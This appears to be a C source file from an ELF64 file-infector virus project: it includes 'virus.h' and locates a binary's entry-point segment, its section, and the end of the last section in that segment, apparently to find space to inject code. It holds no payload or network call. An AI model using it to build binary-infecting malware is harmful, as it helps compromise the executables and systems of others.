
#include "virus.h"
#include "utils.h"
#include "errors.h"

struct	data
{
	struct entry	*stored_entry;
	Elf64_Addr	e_entry;
};

static bool	find_entry_shdr(struct safe_ptr ref, const size_t offset, void *data)
{
	struct data		*closure        = data;
	struct entry		*stored_entry   = closure->stored_entry;
	Elf64_Shdr		*elf64_sect_hdr = safe(ref, offset, sizeof(Elf64_Shdr));

	if (!elf64_sect_hdr) errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);

	const Elf64_Addr	sh_addr = elf64_sect_hdr->sh_addr;
	const Elf64_Xword	sh_size = elf64_sect_hdr->sh_size;

	if (sh_addr <= closure->e_entry && closure->e_entry < sh_addr + sh_size)
		stored_entry->safe_shdr = elf64_sect_hdr;

	const Elf64_Off		p_offset  = stored_entry->safe_phdr->p_offset;
	const Elf64_Off		sh_offset = elf64_sect_hdr->sh_offset;
	const Elf64_Xword	p_filesz  = stored_entry->safe_phdr->p_filesz;

	const size_t		end_of_ptload = p_offset + p_filesz;
	const size_t		end_of_sect   = sh_offset + sh_size;

	if (end_of_sect <= end_of_ptload
	&& (end_of_sect > stored_entry->end_of_last_section))
	{
		stored_entry->safe_last_section_shdr = elf64_sect_hdr;
		stored_entry->end_of_last_section = end_of_sect;
	}

	return true;
}

static bool	find_entry_phdr(struct safe_ptr ref, const size_t offset, void *data)
{
	struct data		*closure       = data;
	struct entry		*stored_entry  = closure->stored_entry;
	Elf64_Phdr		*elf64_seg_hdr = safe(ref, offset, sizeof(Elf64_Phdr));

	if (!elf64_seg_hdr) return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);

	const Elf64_Addr	p_vaddr = elf64_seg_hdr->p_vaddr;
	const Elf64_Xword	p_memsz = elf64_seg_hdr->p_memsz;

	if (p_vaddr <= closure->e_entry && closure->e_entry < p_vaddr + p_memsz)
		stored_entry->safe_phdr = elf64_seg_hdr;
	return true;
}

bool		find_entry(struct entry *entry, struct safe_ptr ref)
{
	struct data	closure;
	Elf64_Ehdr	*safe_elf64_hdr;

	safe_elf64_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
	if (!safe_elf64_hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
	closure.e_entry = (safe_elf64_hdr->e_entry);

	bzero(entry, sizeof(*entry));
	closure.stored_entry = entry;

	if (!foreach_phdr(ref, find_entry_phdr, &closure))
		return errors(ERR_THROW, _ERR_T_FIND_ENTRY);
	if (!entry->safe_phdr)
		return errors(ERR_FILE, _ERR_F_NO_ENTRY_PHDR);

	if (!foreach_shdr(ref, find_entry_shdr, &closure))
		return errors(ERR_THROW, _ERR_T_FIND_ENTRY);
	if (!entry->safe_shdr)
		return errors(ERR_FILE, _ERR_F_NO_ENTRY_SHDR);

	const Elf64_Addr sh_addr  = (entry->safe_shdr->sh_addr);

	entry->offset_in_section = closure.e_entry - sh_addr;

	if (entry->end_of_last_section == 0)
		return errors(ERR_FILE, _ERR_F_NO_SECT_IN_ENTRY_SEG);

	return true;
}
